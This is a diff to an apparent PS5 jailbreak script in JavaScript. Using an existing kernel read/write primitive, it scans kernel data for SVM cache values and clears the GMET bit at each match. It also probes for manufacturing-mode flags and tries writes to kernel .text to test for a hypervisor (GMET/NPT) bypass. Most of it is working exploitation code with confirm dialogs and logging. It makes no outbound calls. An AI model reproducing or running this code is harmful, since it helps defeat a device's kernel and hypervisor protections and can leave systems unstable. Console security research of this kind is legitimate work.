@@ -664,57 +664,106 @@ async function main(userlandRW, wkOnly = false) {
             }
 
             // =========================================================================
-            // REST MODE TEST: Modify SVM cache, go to rest, check after wake
+            // SVM CACHE ANALYSIS - Check multiple potential offsets
             // =========================================================================
 
-            const SVM_CACHE_OFFSET = 0x4bf0;
-            let svmCache = await krw.read4(krw.kdataBase.add32(SVM_CACHE_OFFSET));
-            let gmetBit = (svmCache & 0x40000) !== 0;
+            await log("========== SVM CACHE ANALYSIS ==========", LogLevel.SUCCESS);
 
-            await log("========== SVM CACHE / GMET TEST ==========", LogLevel.SUCCESS);
-            await log("[SVM] Cache at 0x4bf0: 0x" + svmCache.toString(16), LogLevel.INFO);
-            await log("[SVM] GMET bit (18): " + (gmetBit ? "SET" : "CLEAR"), gmetBit ? LogLevel.WARN : LogLevel.SUCCESS);
+            // Check both potential SVM cache locations
+            const SVM_OFFSETS = [0x4bf0, 0x4dcc];
+            let svmLocations = [];
 
-            let doSvmTest = confirm(
-                "REST MODE GMET TEST\n\n" +
-                "Current SVM cache: 0x" + svmCache.toString(16) + "\n" +
-                "GMET bit 18: " + (gmetBit ? "SET (enabled)" : "CLEAR (disabled)") + "\n\n" +
-                "Options:\n" +
-                "OK = Clear GMET bit (for rest mode test)\n" +
-                "Cancel = Skip\n\n" +
-                "After clearing, put PS5 to rest, wake up,\n" +
-                "run exploit again to check if change persisted."
+            for (let offset of SVM_OFFSETS) {
+                let val = await krw.read4(krw.kdataBase.add32(offset));
+                let hasGmet = (val & 0x40000) !== 0;
+                await log("[SVM] 0x" + offset.toString(16) + ": 0x" + val.toString(16) +
+                    (val === 0x740f12 ? " <- GMET SET" : (val === 0x700f12 ? " <- GMET CLEAR" : "")),
+                    hasGmet ? LogLevel.WARN : LogLevel.SUCCESS);
+                if (val === 0x740f12 || val === 0x700f12) {
+                    svmLocations.push({ offset, val, hasGmet });
+                }
+            }
+
+            // Scan for 0x740f12 pattern in writable region
+            await log("[SCAN] Searching for SVM cache value 0x740f12 in 0x0-0x10000...", LogLevel.INFO);
+            let svmMatches = [];
+            for (let off = 0; off < 0x10000; off += 4) {
+                let val = await krw.read4(krw.kdataBase.add32(off));
+                if (val === 0x740f12 || val === 0x700f12) {
+                    svmMatches.push({ offset: off, val });
+                    await log("[SCAN] Found at 0x" + off.toString(16) + ": 0x" + val.toString(16), LogLevel.SUCCESS);
+                }
+            }
+            await log("[SCAN] Found " + svmMatches.length + " SVM cache matches", LogLevel.INFO);
+
+            // =========================================================================
+            // MANUFACTURING MODE SEARCH
+            // =========================================================================
+
+            await log("========== MANUFACTURING MODE SEARCH ==========", LogLevel.SUCCESS);
+
+            // Look for potential manumode flags (small integers 0-3 that could be mode flags)
+            // Known offsets from kernel_data.bin analysis might differ in live memory
+            // Search for characteristic patterns
+
+            // Dump the region around where manumode might be (based on string offsets)
+            // In kernel_data.bin: manumode at 0x43bf5b, curr_manumode at 0x428c67
+            // These are string offsets, not data offsets - need to find actual flag
+
+            await log("[MANU] Searching for mode flags in writable region...", LogLevel.INFO);
+
+            // Look for small values that could be mode flags near interesting offsets
+            let manuCandidates = [];
+            for (let off = 0; off < 0x1000; off += 4) {
+                let val = await krw.read4(krw.kdataBase.add32(off));
+                // Look for values 0, 1, 2, 3 which are typical mode flags
+                if (val >= 0 && val <= 3) {
+                    manuCandidates.push({ offset: off, val });
+                }
+            }
+            await log("[MANU] Found " + manuCandidates.length + " potential mode flags in first 0x1000", LogLevel.INFO);
+
+            // =========================================================================
+            // GMET BYPASS TEST MENU
+            // =========================================================================
+
+            let testChoice = confirm(
+                "HYPERVISOR BYPASS TESTS\n\n" +
+                "SVM cache matches: " + svmMatches.length + "\n" +
+                "Mode flag candidates: " + manuCandidates.length + "\n\n" +
+                "OK = Run GMET clear test on all SVM locations\n" +
+                "Cancel = Skip to next section"
             );
 
-            if (doSvmTest) {
-                if (gmetBit) {
-                    let newValue = svmCache & ~0x40000;
-                    await log("[SVM] Clearing GMET bit...", LogLevel.WARN);
-                    await krw.write4(krw.kdataBase.add32(SVM_CACHE_OFFSET), newValue);
+            if (testChoice && svmMatches.length > 0) {
+                await log("[TEST] Clearing GMET bit at all SVM cache locations...", LogLevel.WARN);
 
-                    let verify = await krw.read4(krw.kdataBase.add32(SVM_CACHE_OFFSET));
-                    await log("[SVM] New value: 0x" + verify.toString(16), LogLevel.INFO);
-                    await log("[SVM] GMET bit now: " + ((verify & 0x40000) ? "SET" : "CLEAR"), LogLevel.SUCCESS);
+                for (let match of svmMatches) {
+                    if (match.val === 0x740f12) {
+                        let newVal = match.val & ~0x40000; // Clear bit 18
+                        await log("[TEST] 0x" + match.offset.toString(16) + ": 0x740f12 -> 0x" + newVal.toString(16), LogLevel.WARN);
+                        await krw.write4(krw.kdataBase.add32(match.offset), newVal);
 
-                    if ((verify & 0x40000) === 0) {
-                        await log("[SVM] SUCCESS! GMET bit cleared!", LogLevel.SUCCESS);
-                        await log("[SVM] Now put PS5 to REST MODE", LogLevel.WARN);
-                        await log("[SVM] After wake, run exploit again to check", LogLevel.WARN);
+                        let verify = await krw.read4(krw.kdataBase.add32(match.offset));
+                        await log("[TEST] Verify: 0x" + verify.toString(16), LogLevel.INFO);
                     }
-                } else {
-                    await log("[SVM] GMET bit already clear! Testing .text write...", LogLevel.SUCCESS);
+                }
 
-                    // Try writing to .text since GMET appears disabled
-                    let doTextWrite = confirm(
-                        ".TEXT WRITE TEST\n\n" +
-                        "GMET bit is CLEAR!\n\n" +
-                        "Try writing to kernel .text?\n" +
-                        "(Writes same byte back - safe test)\n\n" +
-                        "OK = Try .text write\n" +
+                await log("[TEST] All SVM caches modified!", LogLevel.SUCCESS);
+                await log("[TEST] Put PS5 to REST MODE, wake, run exploit again", LogLevel.WARN);
+
+                // Check if any location already has GMET clear
+                let anyCleared = svmMatches.some(m => m.val === 0x700f12);
+                if (anyCleared) {
+                    let tryWrite = confirm(
+                        "GMET ALREADY CLEAR!\n\n" +
+                        "At least one SVM cache has GMET bit cleared.\n" +
+                        "Try writing to kernel .text?\n\n" +
+                        "OK = Test .text write\n" +
                         "Cancel = Skip"
                     );
 
-                    if (doTextWrite) {
+                    if (tryWrite) {
                         await log("[.TEXT] Reading byte from ktextBase...", LogLevel.WARN);
                         let textByte = await krw.read1(krw.ktextBase);
                         await log("[.TEXT] Read: 0x" + textByte.toString(16), LogLevel.INFO);
@@ -724,9 +773,66 @@ async function main(userlandRW, wkOnly = false) {
                             await krw.write1(krw.ktextBase, textByte);
                             await log("[.TEXT] WRITE SUCCEEDED! GMET/NPT BYPASSED!", LogLevel.SUCCESS);
                         } catch (e) {
-                            await log("[.TEXT] Write failed: " + e, LogLevel.ERROR);
+                            await log("[.TEXT] Write failed (expected if HV ignores cache): " + e, LogLevel.ERROR);
                         }
                     }
+                }
+            }
+
+            // =========================================================================
+            // MANUFACTURING MODE TEST
+            // =========================================================================
+
+            let manuTest = confirm(
+                "MANUFACTURING MODE TEST\n\n" +
+                "Try setting mode flags to enable manu mode?\n" +
+                "This will try writing value 1 to potential\n" +
+                "mode flag locations in writable memory.\n\n" +
+                "WARNING: May cause instability!\n\n" +
+                "OK = Try manu mode flags\n" +
+                "Cancel = Skip"
+            );
+
+            if (manuTest) {
+                await log("[MANU] Attempting to set manufacturing mode flags...", LogLevel.WARN);
+
+                // Try some specific offsets that might be mode flags
+                // These are speculative based on typical kernel data layout
+                const MANU_TEST_OFFSETS = [0x0, 0x4, 0x8, 0x10, 0x100, 0x200];
+
+                for (let off of MANU_TEST_OFFSETS) {
+                    let oldVal = await krw.read4(krw.kdataBase.add32(off));
+                    await log("[MANU] 0x" + off.toString(16) + " current: " + oldVal, LogLevel.INFO);
+                }
+
+                // Don't actually write without more research - too risky
+                await log("[MANU] Skipping writes - need more research on flag locations", LogLevel.WARN);
+                await log("[MANU] Use kernel dump to find actual manumode variable offset", LogLevel.INFO);
+            }
+
+            // =========================================================================
+            // .TEXT WRITE TEST (direct attempt)
+            // =========================================================================
+
+            let directTextTest = confirm(
+                "DIRECT .TEXT WRITE TEST\n\n" +
+                "Try writing to kernel .text directly?\n" +
+                "(Will likely crash if GMET/NPT active)\n\n" +
+                "OK = Try .text write\n" +
+                "Cancel = Skip"
+            );
+
+            if (directTextTest) {
+                await log("[.TEXT] Direct write test...", LogLevel.WARN);
+                let textByte = await krw.read1(krw.ktextBase);
+                await log("[.TEXT] Read ktextBase[0]: 0x" + textByte.toString(16), LogLevel.INFO);
+
+                try {
+                    await krw.write1(krw.ktextBase, textByte);
+                    await log("[.TEXT] WRITE SUCCEEDED! HV BYPASSED!", LogLevel.SUCCESS);
+                    alert("SUCCESS! Kernel .text is now writable!");
+                } catch (e) {
+                    await log("[.TEXT] Write failed: " + e, LogLevel.ERROR);
                 }
             }
         }
